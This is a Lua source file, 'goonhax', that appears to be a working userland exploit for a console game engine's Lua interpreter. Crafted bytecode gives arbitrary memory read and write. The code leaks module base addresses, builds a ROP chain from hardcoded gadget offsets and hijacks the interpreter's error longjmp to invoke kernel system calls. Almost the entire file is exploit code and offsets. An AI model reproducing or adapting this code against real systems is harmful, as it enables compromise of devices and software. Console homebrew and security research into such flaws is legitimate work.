-- the SDK bitches and aborts on an invalid mount name
package.path = "./?.lua;save:/lib/?.lua"

local old_print = print

local function init_console()
	e:tag{
		"lyc",
		color = "0xFF000000",
		width = "1280",
		height = "720",
		id = "0"
	}
	e:tag{"fontinit"}
	e:tag{
		"chgmsg",
		id = "debug_mw"
	}
	e:tag{
		"font",
		anchorcenter = "0",
		face = "save:/proggy.ttf",
		-- face = "font/VL-Gothic-Regular.ttf",
		left = "5",
		top = "5",
		width = "1270",
		height = "710",
		size = "26",
		rubysize = "0",
		spacetop = "0",
		spacemiddle = "0",
		spacebottom = "0",
		color = "0xFFFFFF",
		shadowcolor = "0x000000",
		outlinecolor = "0x000000",
		shadow = "0",
		outline = "0",
		rubyshadow = "0",
		rubyoutline = "0",
		align = "left",
		style = "",
		hung = "1",
		stack = "0"
	}
	-- e:tag { "/chgmsg" }
	-- e:tag { "chgmsg", id = "debug_mw" }

	print = function(...)
		local args = {...}
		local formatted_args = {}
		for i, v in ipairs(args) do
			if type(v) == "string" then
				formatted_args[i] = v
			else
				formatted_args[i] = tostring(v)
			end
		end
		old_print(unpack(args))
		e:tag{
			"print",
			data = table.concat(formatted_args, " ")
		}
		e:tag{"rt"}
		-- e:tag { "flip" }
	end
end

local function fatal(err)
	local okfmt, msg = pcall(tostring, err)
	if not okfmt then
		msg = "<unprintable error>"
	end
	pcall(print, "[!] fatal: " .. msg)
	return msg
end

local function addrof(o)
	local s = tostring(o)
	local i = s:find("0x")
	if not i then
		return nil
	end
	return tonumber(s:sub(i + 2), 16)
end
local function f2i(x)
	return x * 2 ^ -52 * 2 ^ -1022
end
local function i2f(x)
	return x * 2 ^ 52 * 2 ^ 1022
end

local offsets_main = {
	-- luaB_print (C closure target)
	luaB_print = 0x129020,
	-- luaD_rawrunprotected's setjmp return
	luaD_rawrunprotected_setjmp_va = 0x12fc7c,
	-- luaD_throw tail (longjmp(lj+8, 1))
	luaD_throw_tail_va = 0x12fb40,
	-- luaD_pcall continuation after rawrun
	luaD_pcall_resume_va = 0x130dec,
	malloc = 0x228fe0,
	free = 0x229040,
}

local offsets_sdk = {
	-- dynsym longjmp
	longjmp = 0x477ea4,
	-- ThreadManagerImplByHorizon::CreateThread
	-- x1=ThreadType*, x2=fn, w3=core; x0=(unused)
	thread_impl_create = 0x0b39b0,
	-- ThreadManagerImplByHorizon::StartThread
	-- x1=ThreadType* (reads [t+0x1b8])
	thread_impl_start = 0x0b3c10,
	-- ldp x3,x4,[sp,#0x10]; ldp x1,x2,[sp],#0x20; ret
	thread_impl_pop_x1_x4 = 0x477dac,
	-- svc #0x0a ; ret
	svc_exit_thread = 0x0d96cc,
	-- svc #0x0b ; ret
	svc_sleep_thread = 0x0d96d4,
	-- svc #0x27 ; ret
	svc_output_debug_string = 0x0d9814,
	-- svc #0x29 veneer: x0=&out, x1=type, x2=handle, x3=subid
	svc_get_info = 0x0d9824,
	-- svc #0x21 ; ret   (calling thread's TLS message buffer, 0x100 bytes)
	svc_send_sync = 0x0d97cc,
	-- svc #0x22 ; ret   (x0=buffer, x1=size, x2=handle; explicit RW page)
	-- offset is the SDK_SVC_STUBS row plus stub contiguity, not a decoded
	-- byte in this tree; the 12-worker Ryujinx run is the only proof so far
	svc_send_sync_user = 0x0d97d4,
	-- svc #0x18 ; ret   (x0=&out, x1=&handle, x2=n, x3=ns)
	svc_wait_sync = 0x0d9774,
	-- svc #0x16 ; ret   (x0=handle)
	svc_close_handle = 0x0d9764,
	-- mrs x0,tpidrro_el0 ; ret
	get_message_buffer_on_tls = 0x0bfea0,
	-- nn::fs::detail lazy singleton (.bss)
	fs_singleton = 0x0b16900,
	-- singleton +0x20: cached SharedPointer<IFileSystemProxy> payload
	fs_proxy = 0x020,
	-- singleton +0x3a8: session HandleAllocator free-list head
	fs_session_pool = 0x03a8,
	-- proxy +0x18: CMIF domain object id
	fs_proxy_domain_id = 0x018,
	-- ldr w0,[x0,#0x44]; ret (pure, no TLS)
	get_thread_priority = 0x0ad7f0,
	-- nn::err::ShowApplicationError
	show_application_error = 0x1a0f60
}

-- since our arb r/w needs 24 bytes for w/r cycle the next 2 GOT offsets we write get trashed! choose carefully :)
-- to make things funnier the symbols are lazy bound
local got_anchors_sdk = {
	-- vi_Initialize = { got = 0x3ad300, va = 0x26c390 } -- trashes vi::OpenDefaultDisplay, vi::CreateLayer
	-- ^ it usefully leaks nnCompat base on Ounce :)
	acos = { got = 0x3ad9e8, va = 0x47f008 }, -- trashes atan2, atan
}

local gadgets = {
	-- ldr x0,[sp,#8]; ldp x29,x30,[sp,#0x10]; add sp,#0x20; ret
	g_load_x0 = 0x076780,
	-- ldp x29,x30,[sp,#0x10]; ldr x19,[sp,#8]; ldr d8,[sp],#0x20; ret
	g_load_x19 = 0x01eee8,
	-- str x0,[x19]; ldp x29,x30,[sp,#0x10]; ldp x20,x19,[sp],#0x20; ret
	g_store_x0_x19 = 0x066970,
	-- sub sp,x29,#0x50; ...; ret
	g_pivot = 0x14a94c,
	-- ldr x8,[x0,#8]; x0=[x19+0x50]; x3=0; x1,x2=[x19+0x20];
	-- x4=0; blr x8; ldp x29,x30,[sp,#0x10]; mov w0,#0;
	-- ldp x20,x19,[sp],#0x20; ret   (x0 result is zeroed)
	g_call3_void = 0x0b6970,
	-- ldp x8,x9,[sp]; ldp x29,x30,[sp,#0x20]; stp x8,x9,[x19];
	-- ldr x19,[sp,#0x10]; add sp,#0x30; ret
	g_load_x8_call5 = 0x22391c,
	-- ldr x2,[sp,#8]; ldp x29,x30,[sp,#0x10]; mov x1,x0;
	-- mov x0,x19; ldr x19,[sp],#0x20; br x2
	g_branch_x2 = 0x1c35d4,
	-- blr x8; ldp x29,x30,[sp,#0x10]; ldr x19,[sp],#0x20; ret
	g_blr_x8_keep_x0 = 0x002f20,
	-- add sp,sp,#0x200; ldp x29,x30,[sp,#0x30];
	-- ldp x20,x19,[sp,#0x20]; ldp x22,x21,[sp,#0x10];
	-- ldr x28,[sp],#0x40; ret   (worker entry)
	g_thread_pivot = 0x111dcc,
	-- main PLT stub for longjmp (imported)
	plt_longjmp = 0x22a5b8,
	-- main .got.plt JUMP_SLOT for longjmp
	got_longjmp = 0x3ad8e0,
	-- main .text size (PLT-range check)
	lua_text_end = 0x22abe8,
	-- unresolved lazy JUMP_SLOT value
	plt0 = 0x229258
}

local offsets_lua = {
	errorjmp = 0x0a8, -- lua_State.errorJmp
	errfunc = 0x0b0, -- lua_State.errfunc (plain pcall = 0)
	lj_b = 0x008, -- lua_longjmp.b (jmp_buf)
	lj_status = 0x140, -- lua_longjmp.status
	jmpbuf_scan = 0x130, -- scan bound inside lua_longjmp
	raw_frame_x29 = 0x168, -- saved x29 in the rawrunprotected frame
	raw_frame_x30 = 0x170, -- saved x30 in the rawrunprotected frame
	lua_errrun = 2, -- LUA_ERRRUN
	lua_errerr = 5 -- LUA_ERRERR
}

-- memory map for our scratch pool
local layout = {
	rop_backup = 0x000,
	rop_forged = 0x200,
	rop_chain = 0x400,
	rop_chain_size = 0x300,
	rop_result = 0x700,
	rop_marker = 0x710,
	rop_scratch = 0x730,
	rop_ounce = 0x750,
	rw_probe = 0x770,
	rw_guard = 0x780,
	main_calls = 0xC00,
	main_calls_size = 0x400,
	thread_priority = 0x10, -- kernel priority = 0x10 + 0x1c
	thread_core = 0,
	thread_tt_size = 0x1C0, -- through the u32 handle at +0x1b8
	thread_tt_alloc = 0x200, -- zeroed through +0x1f8
	slack = 0x10,
	worker_stride = 0x3000,
	worker_block_size = 0x24000,
	worker_tt_off = 0x000,
	worker_stack_off = 0x200,
	worker_stack_size = 0x800,
	worker_top_off = 0xA00,
	worker_pd_off = 0xBB0, -- TOP + 0x1B0
	worker_chain_off = 0xBF0, -- TOP + 0x1F0
	worker_chain_size = 0x410,
	worker_desc_off = 0x1000,
	worker_desc_blocks = 12,
	worker_desc_size = 0xC00, -- 12 blocks * 0x100
	worker_out_off = 0x1C00, -- kernel Result cell (svc #0x22)
	worker_wait_off = 0x1C08, -- svcWaitSynchronization &out
	worker_marker_off = 0x1C10,
	worker_string_off = 0x1C30,
	worker_scratch_off = 0x1C50,
	worker_ipc_off = 0x2000, -- one page-aligned #0x22 buffer per worker
	worker_ipc_size = 0x1000
}

local AddressMap39Start = 0x08000000
local AddressMap39End = 0x7fffffffff

local function exploit()
	collectgarbage("stop")
	init_console()

	print("[*] goonhax by alula")
	print("[*] sending big thanks to: Gezine, pepsipu, retr0id, SciresM, kurumuz, zecoxao")

	print("[+] setting up initial primitives...")
	local HELPER_READ =
		"\27\76\117\97\81\0\1\4\8\4\8\0\13\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\114\101\97\100\0\0\0\0\0\0\0\0\0\0\1\0\4\5\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\156\128\128\0\158\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\48\0\0\0\0\0\0\0\0\0\2\0\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\4\0\0\0\30\0\0\1\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HELPER_WRITE =
		"\27\76\117\97\81\0\1\4\8\4\8\0\14\0\0\0\0\0\0\0\64\104\101\108\112\101\114\95\119\114\105\116\101\0\0\0\0\0\0\0\0\0\0\2\0\6\6\0\0\0\164\0\0\0\0\0\0\1\0\0\0\0\192\0\128\0\156\64\0\1\30\0\128\0\0\0\0\0\1\0\0\0\5\0\0\0\0\0\0\0\64\112\48\119\0\0\0\0\0\0\0\0\0\2\1\0\6\7\0\0\0\164\0\0\0\4\0\0\0\68\0\128\0\192\0\128\0\156\64\0\1\8\0\0\0\30\0\128\0\0\0\0\0\1\0\0\0\4\0\0\0\0\0\0\0\64\112\49\0\0\0\0\0\0\0\0\0\1\1\0\2\2\0\0\0\8\0\0\0\30\0\128\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\0\1\0\0\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\2\0\0\0\3\0\0\0\0\0\0\0\117\118\0\3\0\0\0\0\0\0\0\117\118\0\0\0\0\0\0\0\0\0\0\0\0\0"
	local HR = assert(loadstring(HELPER_READ))
	local HW = assert(loadstring(HELPER_WRITE))

	local function prim(target)
		local T = {}
		T[f2i(0x1111)] = true
		T[f2i(target)] = true
		return T
	end
	local function r64(target)
		local v = HR(prim(target))
		if type(v) == "number" then
			return i2f(v)
		end
		return nil, type(v)
	end
	local function w64(target, qword)
		HW(prim(target), f2i(qword))
	end
	local function code4(addr, ws)
		for i = 1, #ws do
			w64(addr + 4 * (i - 1), ws[i])
		end
	end

	local function destructive_read(a)
		w64(a + 0x8, 3) -- tt = LUA_TNUMBER
		return r64(a)
	end
	local function save_cf(a)
		return destructive_read(a + 0x20)
	end
	local function set_cf(a, f)
		w64(a + 0x20, f)
	end

	-- initialize initial 64k pool
	local pool = {}
	for i = 1, 1024 do
		pool[i] = 0
	end
	local pool_addr = addrof(pool)
	w64(pool_addr + 0x20, 3)
	local heap = r64(pool_addr + 0x18)

	local scratch = heap + 0x900
	w64(scratch, 0x12676721372137)
	local sv = r64(scratch)
	print("[+] testing arb rw")
	assert(sv == 0x12676721372137)

	-- leak main / sdk module bases
	print("[*] leaking module bases")
	local cls_print_addr = addrof(old_print)
	local print_addr = save_cf(cls_print_addr)
	local main_base = print_addr - offsets_main.luaB_print
	assert(main_base % 0x1000 == 0, "failed to leak main module base")

	print(string.format("[+] main @ 0x%x", main_base))

	math.acos(0) -- lazy bound!!!
	local anchor_func = got_anchors_sdk.acos
	local sdk_got_addr = main_base + anchor_func.got
	local sdk_func = destructive_read(sdk_got_addr)
	-- print(string.format("[+] func 0x%x", sdk_func))
	local sdk_base = sdk_func - anchor_func.va
	assert(sdk_base % 0x1000 == 0, "failed to leak sdk module base")

	print(string.format("[+] sdk  @ 0x%x", sdk_base))

	local function run_rop(opts)
		opts = opts or {}
		local co = coroutine.create(function()
			local L = addrof(coroutine.running())
			local ctx = {
				L = L
			}

			local state
			local ok, err = pcall(function()
				w64(L + offsets_lua.errfunc, 3)
				local live = r64(L + offsets_lua.errorjmp)
				w64(L + offsets_lua.errfunc, 0)

				ctx.live = live
				assert(live, "no live errorJmp")

				if opts.capture_jmpbuf then
					local slots = {}
					for off = offsets_lua.jmpbuf_scan, 0, -8 do
						local slot = live + offsets_lua.lj_b + off

						w64(slot + 8, 3)
						slots[off] = r64(slot)
						assert(slots[off] ~= nil, "jmp_buf read failed")
					end

					w64(L + offsets_lua.errfunc, 0)

					local pc_off, sp_off
					for off = offsets_lua.jmpbuf_scan, 0, -8 do
						if slots[off] == main_base + offsets_main.luaD_rawrunprotected_setjmp_va then
							pc_off = off
						end
						if slots[off] == live - 8 then
							sp_off = off
						end
					end

					assert(pc_off and sp_off, "unrecognised jmp_buf layout")

					ctx.slots, ctx.pc_off, ctx.sp_off = slots, pc_off, sp_off
				end

				state = opts.build(ctx)

				opts.fire(ctx, state)
			end)

			if opts.before then
				opts.before(ctx, ok, err, state)
			end

			-- print(string.format("[D] pcall=%s err=%s", tostring(ok), tostring(err)))

			if opts.after then
				opts.after(ctx, ok, err, state)
			end
		end)

		local rok, rerr = coroutine.resume(co)
		-- if rok then
		-- 	print(string.format("[D] coroutine returned (%s)", coroutine.status(co)))
		-- else
		-- 	print(string.format("[D] coroutine failed: %s", tostring(rerr)))
		-- end

		return rok, rerr
	end

	local function new_emitter(chain_base, desc_base, desc_end, scratch, chain_end)
		local E = {
			cursor = chain_base,
			desc = desc_base,
			desc_end = desc_end,
			chain_end = chain_end,
			scratch = scratch or (heap + layout.rop_scratch),
			pending = nil
		}
		local function code(va)
			return main_base + va
		end
		function E:patch(va)
			if self.pending then
				w64(self.pending, va)
			end
		end
		function E:g0(v)
			self:patch(code(gadgets.g_load_x0))
			local b = self.cursor
			w64(b + 8, v or 0);
			w64(b + 0x10, 0)
			self.cursor = b + 0x20
			self.pending = b + 0x18
		end
		function E:g1(v)
			self:patch(code(gadgets.g_load_x19))
			local b = self.cursor
			w64(b + 8, v or 0);
			w64(b + 0x10, 0)
			self.cursor = b + 0x20
			self.pending = b + 0x18
		end
		function E:g2(v20, v19)
			self:patch(code(gadgets.g_store_x0_x19))
			local b = self.cursor
			w64(b, v20 or 0);
			w64(b + 8, v19 or 0);
			w64(b + 0x10, 0)
			self.cursor = b + 0x20
			self.pending = b + 0x18
		end
		function E:peek(addr, cell)
			self:g1(addr)
			self:patch(code(gadgets.g_peek_x0_x19))
			local b = self.cursor
			w64(b, 0) -- x20
			w64(b + 8, cell or (heap + layout.rop_result)) -- x19 = result cell
			w64(b + 0x10, 0) -- x29
			self.cursor = b + 0x20
			self.pending = b + 0x18 -- x30
			self:g2(0, 0) -- str x0,[result cell]
		end
		function E:call3(target, x0v, x1v, x2v)
			self:patch(code(gadgets.g_load_x0))
			local t = self.desc
			local a = t + 0x40
			if t + 0x100 > self.desc_end then
				error("rop descriptor pool overflow", 0)
			end
			self.desc = t + 0x100
			w64(t + 8, target)
			w64(a + 0x20, x1v or 0)
			w64(a + 0x28, x2v or 0)
			w64(a + 0x50, x0v or 0)
			local b0 = self.cursor
			w64(b0 + 8, t);
			w64(b0 + 0x10, 0);
			w64(b0 + 0x18, code(gadgets.g_load_x19))
			self.cursor = b0 + 0x20
			local b1 = self.cursor
			w64(b1 + 8, a);
			w64(b1 + 0x10, 0);
			w64(b1 + 0x18, code(gadgets.g_call3_void))
			self.cursor = b1 + 0x20
			local b2 = self.cursor
			w64(b2, 0);
			w64(b2 + 8, 0);
			w64(b2 + 0x10, 0)
			self.cursor = b2 + 0x20
			self.pending = b2 + 0x18
		end
		function E:call5(target, a0, a1, a2, a3, a4, result_cell)
			self:patch(code(gadgets.g_load_x19))
			local b0 = self.cursor
			w64(b0 + 8, self.scratch);
			w64(b0 + 0x10, 0)
			w64(b0 + 0x18, code(gadgets.g_load_x8_call5))
			self.cursor = b0 + 0x20
			local b1 = self.cursor
			w64(b1, target)
			w64(b1 + 8, 0)
			w64(b1 + 0x10, a0 or 0) -- new x19 = a0
			w64(b1 + 0x18, 0)
			w64(b1 + 0x20, 0) -- x29
			w64(b1 + 0x28, code(gadgets.g_branch_x2))
			self.cursor = b1 + 0x30
			local b2 = self.cursor
			w64(b2, 0) -- new x19 (unused by pop x1..x4)
			w64(b2 + 8, sdk_base + offsets_sdk.thread_impl_pop_x1_x4)
			w64(b2 + 0x10, 0)
			w64(b2 + 0x18, code(gadgets.g_blr_x8_keep_x0))
			self.cursor = b2 + 0x20
			local b3 = self.cursor
			w64(b3, a1 or 0);
			w64(b3 + 8, a2 or 0)
			w64(b3 + 0x10, a3 or 0);
			w64(b3 + 0x18, a4 or 0)
			self.cursor = b3 + 0x20
			local b4 = self.cursor
			w64(b4, result_cell or (heap + layout.rop_result)) -- x19 = result cell
			w64(b4 + 8, 0);
			w64(b4 + 0x10, 0)
			w64(b4 + 0x18, code(gadgets.g_store_x0_x19))
			self.cursor = b4 + 0x20
			local b5 = self.cursor
			w64(b5, 0);
			w64(b5 + 8, 0);
			w64(b5 + 0x10, 0)
			self.cursor = b5 + 0x20
			self.pending = b5 + 0x18
		end
		return E
	end

	local rop_backup = heap + layout.rop_backup
	local rop_forged = heap + layout.rop_forged
	local rop_chain = heap + layout.rop_chain
	local longjmp_b = offsets_lua.lj_b

	local function chain_builder(emit)
		return function(ctx)
			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_backup + off, ctx.slots[off])
			end

			local E = new_emitter(rop_chain, heap + layout.main_calls,
				heap + layout.main_calls + layout.main_calls_size,
				heap + layout.rop_scratch,
				heap + layout.rop_result - layout.slack)

			local b = E.cursor
			w64(b + 8, 0); w64(b + 0x10, 0)
			E.cursor = b + 0x20
			E.pending = b + 0x18
			emit(E)
			E:call3(sdk_base + offsets_sdk.longjmp, rop_backup, offsets_lua.lua_errrun, 0)

			if E.cursor > E.chain_end then
				error("rop chain overlaps the result cell", 0)
			end

			for off = 0, offsets_lua.jmpbuf_scan, 8 do
				w64(rop_forged + longjmp_b + off, ctx.slots[off])
			end
			
			w64(rop_forged + longjmp_b + ctx.pc_off, main_base + gadgets.g_load_x19)
			w64(rop_forged + longjmp_b + ctx.sp_off, rop_chain)
			w64(ctx.live + offsets_lua.lj_status, offsets_lua.lua_errrun)
		end
	end

	local function fire8(ctx)
		w64(ctx.L + offsets_lua.errorjmp, rop_forged)
		w64(ctx.L + offsets_lua.errfunc, 0)
		error("meow", 0)
	end

	local function call5(target, a0, a1, a2, a3, a4, result_cell)
		local RES = result_cell or (heap + layout.rop_result)
		run_rop{
			build = function(ctx)
				return chain_builder(function(E)
					E:call5(target, a0, a1, a2, a3, a4, RES)
				end)(ctx)
			end,
			fire = fire8,
			capture_jmpbuf = true
		}
		w64(RES + 8, 3)
		return r64(RES)
	end

	local function check_ounce()
		local OUT = heap + layout.rop_ounce
		w64(OUT, 0)
		local res = call5(sdk_base + offsets_sdk.svc_get_info, OUT, 32, 0xFFFF8001, 0, 0)
		w64(OUT + 8, 3)
		local value = r64(OUT)
		return res == 0
	end

	local is_ounce = check_ounce()
	print("[*] running on:", is_ounce and "Ounce" or "NX")

	local function tpidrro_el0()
		return call5(sdk_base + offsets_sdk.get_message_buffer_on_tls, 0, 0, 0, 0, 0)
	end

	local tls_addr = tpidrro_el0()
	print(string.format("[+] TPIDRRO_EL0=0x%x", tls_addr))


end

xpcall(exploit, fatal)
